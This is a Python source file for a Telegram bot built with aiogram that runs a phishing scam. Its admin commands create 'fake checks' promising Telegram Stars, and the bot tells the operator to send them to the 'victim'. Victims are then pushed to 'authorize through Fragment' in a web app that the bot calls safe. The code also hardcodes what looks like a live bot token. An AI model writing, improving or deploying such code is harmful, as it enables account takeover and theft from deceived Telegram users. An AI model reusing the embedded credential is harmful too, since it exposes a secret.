# bot.py
import asyncio
import logging
from aiogram import Bot, Dispatcher, types, F
from aiogram.filters import Command
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton, WebAppInfo
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage
import json
import os

TOKEN = "8696501106:AAHIbkUw6ONcKOS0RJ6zuCxemXvfnYV1w9g"
ADMIN_ID = 8503291981
RECEIVER_USERNAME = "@Defbymorgenshtern"
RENDER_URL = os.getenv("RENDER_URL", "https://your-app.onrender.com")

logging.basicConfig(level=logging.INFO)
bot = Bot(token=TOKEN)
dp = Dispatcher(storage=MemoryStorage())

CHECKS_FILE = "checks.json"

def load_checks():
    if os.path.exists(CHECKS_FILE):
        with open(CHECKS_FILE, "r") as f:
            return json.load(f)
    return {}

def save_checks(checks):
    with open(CHECKS_FILE, "w") as f:
        json.dump(checks, f)

class AdminStates(StatesGroup):
    waiting_for_amount = State()

@dp.message(Command("start"))
async def cmd_start(message: types.Message):
    if message.from_user.id == ADMIN_ID:
        await message.answer("⚙️ Админ-панель готова.\n/admin — создать чек\n/checks — список чеков")
    else:
        await message.answer("Нажмите на кнопку в чеке для получения звёзд.")

@dp.message(Command("admin"))
async def cmd_admin(message: types.Message, state: FSMContext):
    if message.from_user.id != ADMIN_ID:
        return
    await message.answer("💰 Введите сумму звёзд для фейкового чека:")
    await state.set_state(AdminStates.waiting_for_amount)

@dp.message(AdminStates.waiting_for_amount)
async def process_amount(message: types.Message, state: FSMContext):
    if message.from_user.id != ADMIN_ID:
        return
    try:
        amount = int(message.text)
        check_id = f"check_{message.date.timestamp()}"
        
        checks = load_checks()
        checks[check_id] = {
            "amount": amount,
            "created_by": ADMIN_ID,
            "created_at": str(message.date)
        }
        save_checks(checks)
        
        webapp_url = f"{RENDER_URL}/check/{check_id}"
        kb = InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text=f"⭐ Получить {amount} звёзд", web_app=WebAppInfo(url=webapp_url))]
        ])
        
        await message.answer(
            f"✅ Чек создан!\n\n"
            f"💎 Сумма: {amount} ⭐\n"
            f"🆔 ID: {check_id}\n\n"
            f"Отправьте это сообщение жертве:",
            reply_markup=kb
        )
        await state.clear()
    except ValueError:
        await message.answer("❌ Введите число!")

@dp.message(Command("checks"))
async def cmd_checks(message: types.Message):
    if message.from_user.id != ADMIN_ID:
        return
    checks = load_checks()
    if not checks:
        await message.answer("📭 Нет созданных чеков.")
        return
    text = "📋 Список чеков:\n\n"
    for cid, data in checks.items():
        text += f"🆔 {cid}\n💎 {data['amount']} ⭐\n📅 {data['created_at']}\n\n"
    await message.answer(text)

@dp.message(Command("menu"))
async def cmd_menu(message: types.Message):
    webapp_url = f"{RENDER_URL}/auth"
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="💸 Вывести звёзды", callback_data="withdraw_request")],
        [InlineKeyboardButton(text="👤 Профиль", callback_data="profile")]
    ])
    await message.answer("⭐ Главное меню\nВыберите действие:", reply_markup=kb)

@dp.callback_query(F.data == "withdraw_request")
async def withdraw_request(callback: types.CallbackQuery):
    webapp_url = f"{RENDER_URL}/auth"
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="🔐 Авторизоваться через Fragment", web_app=WebAppInfo(url=webapp_url))]
    ])
    await callback.message.answer(
        "⚠️ Для вывода звёзд необходима авторизация через Fragment.\n\n"
        "Это безопасный способ подтвердить владение аккаунтом.",
        reply_markup=kb
    )
    await callback.answer()

@dp.callback_query(F.data == "profile")
async def profile(callback: types.CallbackQuery):
    await callback.message.answer(f"👤 Ваш профиль\n\n⭐ Баланс: доступен после авторизации\n🎁 Подарки: проверьте в /menu")
    await callback.answer()

@dp.message()
async def catch_all(message: types.Message):
    if message.from_user.id == ADMIN_ID:
        await message.answer("Используйте /admin для создания чека или /checks для просмотра.")
    else:
        await message.answer("Используйте /menu для доступа к функциям.")

async def main():
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
